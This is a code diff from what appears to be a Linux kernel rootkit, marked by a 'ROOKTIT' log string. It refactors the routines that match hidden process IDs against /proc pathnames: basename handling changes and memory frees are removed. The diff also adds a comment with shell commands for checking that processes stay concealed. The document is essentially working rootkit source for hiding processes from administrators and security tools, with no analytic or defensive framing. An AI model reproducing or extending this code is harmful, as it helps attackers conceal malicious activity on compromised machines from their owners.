@@ -145,32 +145,24 @@ bool is_pid_hidden(int pid){
 	return false;
 }
 
-static char* my_basename(const char* pathname){
+static 	char* my_basename(const char* pathname){
+	// Gets the basename keeping the trailing '/' if present
 	// Examples: 1234/ /1234 1234 proc/1234 /1234/
-	// Get the basename
 	int len = strlen(pathname);
 	const char* basename = pathname;
 	for (int i = 0; i < len-1; i++)
 		if (pathname[i] == '/')
 			basename = pathname+i+1;
 
-	// Allocate memory and copy it
-	len = strlen(basename);
-	char* result = kmalloc(len+1, GFP_KERNEL);
-	if (result == NULL){
-		log("ROOKTIT: ERROR kmalloc(%d) in my_basename", len+1);
-		return result;
-	}
-	strncpy(result, basename, len);
-
-	// Delete / on last character
-	if (result[len-1] == '/') 
-		result[len-1] = '\x00';
-
-	return result;
+	return basename;
 }
 
 int pid_in_pathname(const char __user* pathname){
+	/* For testing, these checks should be enough:
+	 *   ls /proc/$PID; cat /proc/$PID/cmdline
+	 *   cd /proc; ls $PID; cat $PID/cmdline
+	 * Also same but using cd instead of ls and adding '/' at the end.
+	*/
     struct list_pids_node* node;
 	char pid_str[8], pid_str2[9];
 	char* filename;
@@ -192,18 +184,16 @@ int pid_in_pathname(const char __user* pathname){
 	strncpy_from_user(my_pathname, pathname, len);
 
 	// Check if the basename of the pathname matches a hidden PID
-	// or if the pathname includes a folder called PID
+	// or if the pathname includes a folder called PID (it can be
+	// the basename ended in '/')
 	list_for_each_entry(node, &list_pids, list){
 		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
 		snprintf(pid_str2, sizeof(pid_str2), "%d/", node->pid);
 		filename = my_basename(my_pathname);
-		if (filename == NULL) continue; // don't free it
 		if (strcmp(pid_str, filename) == 0 || strstr(my_pathname, pid_str2) != NULL){
 			ret = node->pid;
-			kfree(filename);
 			break;
 		}
-		kfree(filename);
 	}
 	kfree(my_pathname);
 	return ret;
